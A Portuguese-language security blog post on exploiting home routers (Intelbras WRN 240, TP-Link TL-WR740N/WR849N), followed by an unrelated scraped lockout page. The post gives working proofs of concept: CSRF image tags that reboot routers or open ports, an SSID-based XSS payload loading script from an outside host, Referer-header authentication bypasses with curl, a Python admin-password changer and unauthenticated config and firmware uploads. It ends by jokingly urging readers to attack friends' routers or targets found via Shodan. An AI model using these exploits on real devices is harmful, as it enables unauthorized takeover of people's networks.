=== Content from fireshellsecurity.team_0f9ed608_20250121_010617.html ===

[![](/assets/images/title.gif)](/)

* [Home](/)
* [Team](/team/)
* [Articles](/articles/)
* [Portfolio](/portfolio/)
* [Sponsors](/sponsors/)
* [About](/about/)

Wednesday, November 20, 2019

# Hack 'N' Routers - Vulnerabilidades comuns em roteadores dom√©sticos - [PT-BR]

by [Elber "f0lds" Tavares](/f0lds/)

Hack 'N' Routers - Vulnerabilidades comuns em roteadores dom√©sticos - [PT-BR]

Hackers xiaomi e androids, algumas pessoas j√° vem me pedindo a algum tempo para falar um pouco sobre algumas vulns e exploits para roteadores (acho que √© para fins educacionais), ent√£o, hoje irei falar sobre algumas vulnerabilidades presentes em alguns modelos de roteadores dom√©sticos, os quais na maioria das vezes seus donos/usu√°rios n√£o se preocupam em manter sua firmware atualizado, tamb√©m citarei exemplos explicando por que na maioria das vezes manter seu aparelho atualizado ainda poder√° deixar passar alguns ataques.

Usarei os roteadores de marcas Intelbras e TP-Link nos exemplos, pois at√© agora s√£o os √∫nicos que tenho em m√£os para realizar os testes, mas acredito que sirva de base para que voc√™s possam replicar os mesmos bugs em outros modelos.

Come√ßando pelo bom e velho Intelbras, acho que tudo que tem ‚ÄúIntelbras‚Äù em seu nome ter√° esses mesmos bugs, vou citar s√≥ alguns exemplos em determinados modelos e vers√µes, mas os bugs foram testados em outros tipos de pain√©is e na maioria eles estavam l√°.

## CSRF

### Roteador Wireless N 150 Mbps -WRN 240

![itb](https://i.imgur.com/Wqpbpj9.png)

Acho que essa √© a vulnerabilidade mais comum e conhecida nesses roteadores, [Cross-site Request Forgery](https://pt.wikipedia.org/wiki/Cross-site_request_forgery) (CSRF ou XSRF), em portugu√™s falsifica√ß√£o de solicita√ß√£o entre sites, tamb√©m conhecido como ataque de um clique.

Para salvar ou alterar alguma informa√ß√£o, seu painel adiciona esses valores em par√¢metros em uma URL e faz a requisi√ß√£o via GET, onde essa URL √© requisitada atrav√©s de javascript ou iframe.

**Exemplo**

Para reiniciar o roteador, quando vamos l√° no menu e clicamos no bot√£o reiniciar, o painel faz a requisi√ß√£o para o endere√ßo: `http://192.168.0.1/userRpm/SysRebootRpm.htm?Reboot=Reiniciar`

![restart](https://i.imgur.com/Uq1aiXb.png)

E ent√£o o roteador reinicia.

Poder√≠amos fazer o mesmo procedimento de uma maneira ‚Äúescondida‚Äù do admin.

```
$ echo ‚Äú<img src=‚Äôhttp://192.168.0.1/userRpm/SysRebootRpm.htm?Reboot=Reiniciar‚Äô>‚Äù > poc.html

```

![poc](https://i.imgur.com/mBunIIJ.png)

Agora podemos usar para alterar algumas outras informa√ß√µes como, nome da rede wifi, senhas, adicionar portas redirecionadas, mudar DNS etc.

**V√≠deo salvo em 02/07/2018**

Tamb√©m testado no painel do *WRN 150*

![wrn](https://i.imgur.com/xo7Oz5g.png)

### Outro exemplo, agora com o **TP-LINK 150M Wireless N Router Model No. TL-WR740N**

```
<img src="http://192.168.0.1/userRpm/VirtualServerRpm.htm?ExPort=22&InPort=22&Ip=192.168.0.100&Protocol=1&State=1&Commonport=0&Changed=0&SelIndex=0&Page=1&Save=Save">

```
## XSS

Podemos encontrar XSS facilmente em v√°rios inputs, principalmente se juntarmos o CSRF+XSS.

Mas vou mostrar um que achei mais ‚Äúapresent√°vel‚Äù pelo fato de que podemos encontrar o mesmo bug em outros dispositivos al√©m de roteadores.

O XSS por SSID de um outro AP, nos roteadores podemos encontrar esse bug em p√°ginas que mostrem SSID de outras redes, normalmente nas configura√ß√µes para adicionar um novo ‚ÄúAP‚Äù.

Como o painel estar√° mostrando o nome das outras redes wireless, as vezes ele n√£o filtra esses SSID e com isso conseguimos nosso XXS.

**Exemplo**

Subindo nosso payload:

```
airbase-ng -e "</script><script src='//elb.me'>" -c 8 -v wlan0mon

```

Conteudo em *elb.me*:

```
alert('xss');

```
### Resultado

![alert](https://i.imgur.com/F12K9wP.png)

Tenho um post sobre isso, explicando mais detalhadamente:

* [XSS NO ROTEADOR INTELBRAS WRN 240](https://fireshellsecurity.team/cve-2017-14219-xss-no-roteador-intelbras-wrn-240/)

## Auth Bypass: Alterando firmware e configura√ß√µes sem autenticar no painel

Primeiro come√ßarei falando de um bug que encontrei num dos roteadores da TP-Link, n√£o vou tomar os cr√©ditos para mim pois enquanto pesquisava notei que algu√©m j√° tinha reportado os mesmos, s√≥ que em outros modelos.

As vulnerabilidades baseavam-se em conseguir alterar ou ver informa√ß√µes no painel do roteador somente estando na mesma rede que o dispositivo, informa√ß√µes que somente quem poderia ver seriam pessoas que estivessem autenticadas nessa √°rea administrativa.

A aplica√ß√£o n√£o ignorava headers de autentica√ß√£o, principalmente o `"Cookie: Authorization=Basic BASE64="` mas verificava apenas o `"Referer: http://ip.router/"`, pois para ela se o usu√°rio estava vindo com esse header, ele certamente estaria autenticado na plataforma, isso abriu ### portas para um novo ataque.

**Exemplo**

```
curl -X GET http://192.168.0.1/cgi/conf.bin

```

Resposta: `HTTP/1.1 403 Forbidden`

```
curl -X GET -H "Referer: http://192.168.0.1/mainFrame.htm" http://192.168.0.1/cgi/conf.bin

```

Resposta: `HTTP/1.1 200 OK`

#### Exemplo de altera√ß√£o de senha do painel do roteador:

```
import requests

new = input('New Pass: ')
url = 'http://192.168.0.1/cgi?8'
headers = {'Content-Type': 'text/plain',
 'Referer': 'http://192.168.0.1/mainFrame.htm'}

data = ''
data += '[/cgi/auth#0,0,0,0,0,0#0,0,0,0,0,0]0,3\x0d\x0a'
data += 'oldPwd=admin\x0d\x0a'
data += 'name=admin\x0d\x0a'
data += 'pwd='+new+'\x0d\x0a'

r = requests.post(url,data=data,headers=headers)

print(r.text)

```
## Novos firmwares velhas vulns

Atualizei minha firmware para a nova vers√£o publicada no site do distribuidor, e decidi verificar se algo tinha mudado, e realmente o bug do `Referer` n√£o estava mais l√°, independente de `Referer` ou n√£o, todas as requisi√ß√µes GET estavam sendo liberadas somente para quem tivesse o *cookie* certo.

Mas ainda sobrou alguns lugares em que as altera√ß√µes eram feitas via POST, que no caso seriam: Restaurar arquivos de backup e alterar ou atualizar a firmware.

Restaurando backup do modelo Intelbras, mesmo removendo o `Authorization: Basic` ainda conseguimos fazer o upload do arquivo:

> Modelo testado - WRN240 (v√°rios modelos e vers√µes de firmware tamb√©m apresentaram o mesmo bug).

![](https://i.imgur.com/xFI9Ulv.png)

Uma boa ideia para tentar, seria baixar um arquivo de backup do seu *router* e subir o mesmo no *router* do seu amigo:

#### PoC

```
curl -i -X POST -H "Content-Type: multipart/form-data" -H "Referer: http://192.168.0.1/userRpm/BakNRestoreRpm.htm" -F data=@config.bin http://192.1680.1/incoming/RouterBakCfgUpload.cfg

```

O mesmo acontece com a op√ß√£o de atualizar a firmware.

![](https://i.imgur.com/3bEJT2e.png)

#### TP-Link

> Modelo testado TP-LINK TL-WR849N 0.9.1 4.16

![](https://i.imgur.com/oedwA0w.png)

```
curl -i -X POST -H "Content-Type: multipart/form-data" -H "Referer: http://192.168.0.2/mainFrame.htm" -F data=@conf.binhttp://192.168.0.2/cgi/confup

```
## N√£o fa√ßam isso em casa

Por enquanto √© s√≥ isso, atualizarei este post frequentemente caso tenham mais modelos e novos bugs para demonstrar, n√£o tentem reproduzir essas perip√©cias em casa, tentem nos *routers* de amigos ou no Shodan, √© mais divertido üòâ.

![rip](https://i.imgur.com/cirhrTd.jpg)

## Refer√™ncias

* [XSS NO ROTEADOR INTELBRAS WRN 240](https://fireshellsecurity.team/cve-2017-14219-xss-no-roteador-intelbras-wrn-240/)
* [intelbras dns change csrf](https://www.youtube.com/watch?v=6VliMWsu3hc)
* [TP-LINK: Derrubando painel administrador com 1 requisi√ß√£o (Sem autentica√ß√£o)](https://youtu.be/qxIbyd3MK9Y)
* [POC Router](https://www.youtube.com/watch?v=oRPOKkdrGv4)
* [TP-Link TL-WR840N/TL-WR841N - Authenticaton Bypass](https://www.exploit-db.com/exploits/44781)
* [Exploit Database Advanced Search - Title: TP-Link](https://www.exploit-db.com/search?q=TP-Link)

[Common Vulnerabilities and Exposures](/cve/)
,
[Pentest](/pentest/)
,
[Proof of Concept](/poc/)

Please enable JavaScript to view the [comments powered by Disqus.](https://disqus.com/?ref_noscript)

---

All content copyright FireShell Security Team ¬© 2017 - 2024.

All rights reserved.



=== Content from packetstormsecurity.com_c3cf5039_20250121_010616.html ===

[![](/logos/smalllogobeta.png)](/)

* files
* news
* users
* cve

[![](/logos/smalllogobeta.png)](/)

* files
* news
* users
* cve

![](/logos/linegray.png)

LOCKED OUT‚õî 24 hour lockout initiated

hi. we regret to inform you that a condition has occurred that has resulted in a 24 hour lockout. this occurs when rate limiting controls are exceeded or when someone attempts to hack the system but fails too many times. we wish you luck in your future attempts tomorrow.
